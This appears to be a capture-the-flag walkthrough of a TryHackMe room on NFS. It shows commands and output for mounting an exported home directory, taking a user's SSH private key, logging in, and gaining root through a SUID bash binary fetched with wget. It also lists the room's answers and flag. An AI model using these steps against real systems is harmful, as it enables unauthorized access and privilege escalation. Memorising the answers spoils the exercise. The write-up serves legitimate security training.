Task 1 - Get Connected
------------------------------------

Hello and welcome!

This room is a sequel to the first network services room. Similarly, it will explore a few more common Network Service vulnerabilities and misconfigurations that you're likely to find in CTFs, and some penetration test scenarios.

I would encourage you to complete the first network services room ([https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices)) before attempting this one.

As with the previous room, it is definitely worth having a basic knowledge of Linux before attempting this room. If you think you'll need some help with this, try completing the 'Linux Fundamentals' module ([https://tryhackme.com/module/linux-fundamentals](https://tryhackme.com/module/linux-fundamentals))

Before we get started:  

1.  Connect to the TryHackMe OpenVPN Server (See [https://tryhackme.com/access](https://tryhackme.com/access) for help!)
2.  Make sure you're sitting comfortably, and have a cup of Tea, Coffee or Water close!

Lets get started!

**N.B.** This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 ([https://tryhackme.com/room/wifihacking101](https://tryhackme.com/room/wifihacking101))

Task 2 - Understanding NFS
-------------------------------------------

**What is NFS?**

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

**How does NFS work?**

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: [https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

-    The file handle
-    The name of the file to be accessed
-    The user's, user ID
-    The user's group ID  
    

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.  

**What runs NFS?**

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

**More Information:**

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

Task 3 - Enumerating NFS
----------------------------------------

**Let's Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware - this can take up to five minutes so be patient!

**What is Enumeration?**

Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - [Infosec Institute](https://resources.infosecinstitute.com/what-is-enumeration/). It is a critical phase when considering how to enumerate and exploit a remote machine - as the information you will use to inform your attacks will come from this stage

**Requirements**

In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: **nfs-common**.

**NFS-Common**

It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: **l****ockd, statd**, **showmount**, **nfsstat,** **gssd**, **idmapd** and **mount.nfs**. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: [https://packages.ubuntu.com/jammy/nfs-common](https://packages.ubuntu.com/jammy/nfs-common).

You can install **nfs-common** using "_sudo apt install nfs-common_", it is part of the default repositories for most Linux distributions such as the Kali Remote Machine or AttackBox that is provided to TryHackMe.

**Port Scanning**

Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about **nmap** in more detail please have a look at the [nmap](https://tryhackme.com/room/furthernmap) room.

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using **nmap** with the **-A** and **-p-** tags.

**Mounting NFS shares**

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create  
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

**sudo mount -t nfs IP:share /tmp/mount/ -nolock**

Let's break this down

| Tag      | Function                                                                    |
| -------- | --------------------------------------------------------------------------- |
| sudo     | Run as root                                                                 |
| mount    | Execute the mount command                                                   |
| -t nfs   | Type of device to mount, then specifying that it's NFS                      |
| IP:share | The IP Address of the NFS Server, and he name of the share we wish to mount |
| -nolock  | Specifies not to use NLM locking                                                                            |

Now we understand our tools, let's get started!

__Questions__

Conduct a **thorough** port scan scan of your choosing, how many ports are open?

A normal scan of the 1st 1000 ports shows only 3 ports open. This is incorrect answer. The text said a 'thorough'  scan. For some reason NMAP still hasn't returned after almost 2 hours of waiting. I've already exploited this box and coming back to this.  I don't see the need for this kind of question on a practice which has nothing to do with  NFS. It's a good habbit I guess to be thorough...
```bash
root@ip-10-10-230-40:~# nmap -sV -sS 10.10.13.245

Starting Nmap 7.60 ( https://nmap.org ) at 2023-04-23 00:47 BST

Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```
 but.. if you are like me and can find the service and hack it faster than you can scan it and just want the answer another way to get at it is once you have root you can run this on the box:
```bash
bash-4.4# netstat -ant |grep '0.0.0.0' 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:40415           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:55179           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:53229           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:54607           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
```
Ususally you can just grep for 'LISTEN' to show what ports are listening, but to make it easier for you to see the ports listening to the eth0 interface I use `0.0.0.0`. There is a total of 7 of those.

As an aside, in real situations, you may never have the luxury of a good nmap scan unless you are in a hurry and want to get found out/stopped in your tracks.
Answer: _7_

Which port contains the service we're looking to enumerate?
Answer: _2049_

Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
```bash
root@ip-10-10-230-40:~# showmount -e 10.10.13.245
Export list for 10.10.13.245:
/home *
```
Answer: _/home_

  
Time to mount the share to our local machine!

First, use "_mkdir /tmp/mount_" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
```bash
root@ip-10-10-230-40:~# sudo mount -t nfs 10.10.13.245:/home /tmp/mount/ -nolockroot@ip-10-10-230-40:~# mount 
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs 

[ .. ]

10.10.13.245:/home on /tmp/mount type nfs4 (rw,relatime,vers=4.2,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.10.230.40,local_lock=none,addr=10.10.13.245)
root@ip-10-10-230-40:~# cd /tmp/mount/
root@ip-10-10-230-40:/tmp/mount# ls
cappucino

```
Answer: _cappucino_

  
Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...
Answer: _None Needed_

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde**rs** could cont**a**in keys that would give us remote access to the server?
Answer: _.ssh_

Which of these keys is most useful to us?
**HINT:** What is the default name of an SSH identity file?
Answer: _id_rsa_

Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".

Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.

Can we log into the machine using _ssh -i key-file username@ip_ ? (Y/N)
```bash
root@ip-10-10-230-40:/tmp/mount/cappucino# cd .ssh
root@ip-10-10-230-40:/tmp/mount/cappucino/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@ip-10-10-230-40:/tmp/mount/cappucino/.ssh# cp id_rsa ~
root@ip-10-10-230-40:/tmp/mount/cappucino/.ssh# cd
root@ip-10-10-230-40:~# ls
Desktop    id_rsa        Pictures  Rooms    thinclient_drives
Downloads  Instructions  Postman   Scripts  Tools
root@ip-10-10-230-40:~# chmod 600 id_rsa
```

To see the userid, you can check the name in the pubic key. It's not required to have it in there but most people leave it in. It is there:
```bash
root@ip-10-10-230-40:~# cp /tmp/mount/cappucino/.ssh/id_rsa.pub .
root@ip-10-10-230-40:~# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTck1wS7orcud8ViGJKNYxrgrFPhDgpOH243FBoEFgfCdzv7WcWXgUgI+GPPyQsebPzbrAMZT/HjpEmejuXWfRjjLlVM5f+hoalN2aZt9TAZi84+7cWP3as+iq79FwUE1uuep+l9qN6KeQzC1w4sE6lJqTXc/ySbonAHMQu8rDZrYYvg1IzOyRVbo81MqIKDA6YUlPhY6K+SSBcCe5Hg9e39NKQCCk3coMJHVrXEOGQ7z7PES+kM/zWufY8PjSWZ96H/IbrAn2xWWqbWD0hujMcAFpM+HHV3xEOfQLPqBW+w21LqHKoFBrNS047Gt4e6fNGlpuneQBZ/8CjrZ9NH2H cappucino@polonfs
root@ip-10-10-230-40:~# 
```

Now we can try to login now that we have all of the details and have changed the private key perms to 600:
```bash
root@ip-10-10-230-40:~# ssh -i id_rsa cappucino@10.10.13.245

Task 4 - Exploiting NFS
------------------------------------

**We're done, right?**  

Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

**What is root_squash?**

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

**SUID**

So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

**Method**

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

**The Executable**

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it [here](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). If you want to download it via the command line, be careful not to download the github page instead of the raw script. You can use `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`.  

**Mapped Out Pathway:**

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:

  
    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS

Lets do this!

__Questions__

  
First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

Answer: _None Needed_

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
```bash
root@ip-10-10-230-40:~# wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

Now we need to check/change the file perms of the downloaded binary. It should be owned by the root user. Then copy the file we downloaded to the NFS share:
```bash
root@ip-10-10-230-40:/tmp/mount/cappucino# ls -al bash
-rw-r--r-- 1 root root 1113504 Apr 23 01:19 bash

root@ip-10-10-230-40:~# cp bash /tmp/mount/cappucino/.
```
Answer: _None Needed_

Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
Answer: _s_

Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
```bash

root@ip-10-10-230-40:/tmp/mount/cappucino# ls -al bash
-rwsr-sr-x 1 root root 1113504 Apr 23 01:19 bash
```
Answer: _-rwsr-sr-x_

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "_./bash -p_". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

SSH Back into the Victim from your Attackbox:
```bash
root@ip-10-10-230-40:~# ssh -i id_rsa cappucino@10.10.13.245

Check the perms on the new bash script we put in the user home and modified perms on:
```bash

Last login: Sun Apr 23 00:04:11 2023 from 10.10.230.40
cappucino@polonfs:~$ ls -al bash
-rwsr-sr-x 1 root root 1113504 Apr 23 00:19 bash
```

Get root! (The -p flag persists the permissions)
```bash
cappucino@polonfs:~$ ./bash -p
bash-4.4# whoami
root
bash-4.4# 
```
Answer: _None Needed_

Great! If all's gone well you should have a shell as root! What's the root flag?
```bash
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
THM{nfs_got_pwned}
```
Answer: _THM{nfs_got_pwned}_
